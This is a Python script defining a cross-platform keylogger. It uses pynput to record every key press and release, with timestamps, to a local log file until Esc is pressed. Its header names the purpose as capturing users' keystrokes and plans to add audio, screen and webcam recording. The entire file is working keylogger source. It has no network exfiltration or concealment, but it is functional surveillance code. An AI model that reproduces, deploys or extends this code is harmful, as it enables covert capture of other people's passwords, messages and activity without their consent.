## ------------------------------------------------------------------------------------- ##
##  Script Name:    Keylogger
##
##  Purpose:        To capture and record keystrokes of users on Windows, Mac, or Linux
##
##  Date Created:   12/13/2023
##
##  Notes:          Once completed, would like to include audio recording, screen recording,
##                  and webcam recording capabilites 
##
##  To-Do:          Handle input buffer if the terminal is used
##                  Fix duplicate messages in the output file
## ------------------------------------------------------------------------------------- ##

from pynput.keyboard import Key, Listener
import logging
import datetime
import sys

class KeyLogger:

    def __init__(self, log_file='KeyloggerOutput.log') -> None:
        self.log_file = log_file
        self.last_event = None
        self.release_hold = 0.125
        self.configure_logger()

    # Method to configure the logger we want
    def configure_logger(self) -> None:
        # Configure the root logger to the INFO level and set the format
        logging.basicConfig(filename=self.log_file, level=logging.INFO, format='%(levelname)s - %(message)s')

        # Create the logger 
        self.logger = logging.getLogger('keystroke_logger')

    # Method to get the timestamp with the desired format for output file
    @staticmethod
    def get_timestamp() -> str:
        currentTime = datetime.datetime.now().strftime('%m-%d-%Y %H:%M:%S')
        return currentTime
    
    # Method to capture the keystroke attribute
    def get_keystroke_rep(self, key: Key) -> str:
        # Handle the keys that are pressed
        try: 
            key_pressed = key.char
        except AttributeError:
            key_pressed = key.name
        return key_pressed
    
    # Method to log the pressed keystroke info
    def log_keystroke_pressed(self, key) -> None:
        # Check the key pressed to stop logging information
        if key == Key.esc:
            self.stop_log()
        
        timestamp = self.get_timestamp()
        self.last_event = datetime.datetime.now()
        self.logger.info(f'Keystroke {self.get_keystroke_rep(key)} pressed event at {timestamp}')

    # Method to log the released keystroke
    def log_keystroke_released(self, key) -> None:
        if self.last_event is not None:
            current = datetime.datetime.now()
            elapsed = (current - self.last_event).total_seconds()

            if elapsed > self.release_hold:
                timestamp = self.get_timestamp()
                self.logger.info(f'Keystroke {self.get_keystroke_rep(key)} released event at {timestamp}')

    # Method to start the logging
    def start_log(self) -> None:
        with Listener(on_press=self.log_keystroke_pressed, on_release=self.log_keystroke_released) as listener:
            listener.join()

    # Method to stop the keylogger program from running
    def stop_log(self) -> None:
        sys.exit()